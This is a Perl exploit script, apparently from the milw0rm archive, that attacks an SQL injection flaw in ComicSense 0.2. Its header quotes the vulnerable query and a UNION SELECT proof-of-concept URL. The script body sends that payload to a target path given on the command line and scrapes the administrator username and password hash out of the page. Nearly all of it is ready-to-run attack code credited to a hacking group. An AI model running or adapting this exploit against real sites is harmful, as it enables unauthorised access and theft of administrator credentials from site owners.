#!/usr/bin/perl -w

#################################################################################
#										#
#		  	ComicSense 0.2 SQL Injection Exploit   			#
#										#
# Discovered by: s0cratex							#
# Payload: Admin Username & Hash Retrieval					#
# Website: http://www.w4ck1ng.com						#
#										#
# Original Advisory: http://seclists.org/bugtraq/2007/Jun/0063.html		#
#		     http://milw0rm.com/exploits/4035				#
# 										#
# Vulnerable Code (index.php): 							#
#										#
#      $sqlQuery = "SELECT * FROM " . $prefix . "comic WHERE episodenr = $epi"; #
#										#
# PoC: http://victim.com/index.php?epi=-999 UNION SELECT username,0,password 	#
#      FROM users LIMIT 1							#
# 										#
# Subject To: Nothing								#
# GoogleDork: Get your own!							#
#										#
# Shoutz: The entire w4ck1ng community & s0cratex				#
#										#
#################################################################################

use LWP::UserAgent;
if (@ARGV < 1){
print "-------------------------------------------------------------------------\r\n";
print "               	 ComicSense 0.2 SQL Injection Exploit\r\n";
print "-------------------------------------------------------------------------\r\n";
print "Usage: w4ck1ng_comicsense.pl [PATH]\r\n\r\n";
print "[PATH] = Path where ComicSense is located\r\n\r\n";
print "e.g. w4ck1ng_comicsense.pl http://victim.com/comic/\r\n";
print "-------------------------------------------------------------------------\r\n";
print "            		 http://www.w4ck1ng.com\r\n";
print "            		        ...Silentz\r\n";
print "-------------------------------------------------------------------------\r\n";
exit();
}

$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');

$host = $ARGV[0] . "index.php?epi=-999 UNION SELECT username,0,password FROM users LIMIT 1";

$res = $b->request(HTTP::Request->new(GET=>$host));
$res->content =~ /.jpg" alt="#(.*?):/;

  ($user) = $res->content =~ /.jpg" alt="#(.*?):/;
  ($hash) = $res->content =~ /: ([0-9a-fA-F]{32})" \/>/;

if($user && $hash){

print "-------------------------------------------------------------------------\r\n";
print "               	 ComicSense 0.2 SQL Injection Exploit\r\n";
print "-------------------------------------------------------------------------\r\n";
print "[+] Admin User : $user\n";
print "[+] Admin Hash : $hash\n";
print "-------------------------------------------------------------------------\r\n";
print "            		 http://www.w4ck1ng.com\r\n";
print "            		        ...Silentz\r\n";
print "-------------------------------------------------------------------------\r\n";
} else {
  print "\nExploit Failed...\n";
}

# milw0rm.com [2007-06-06]
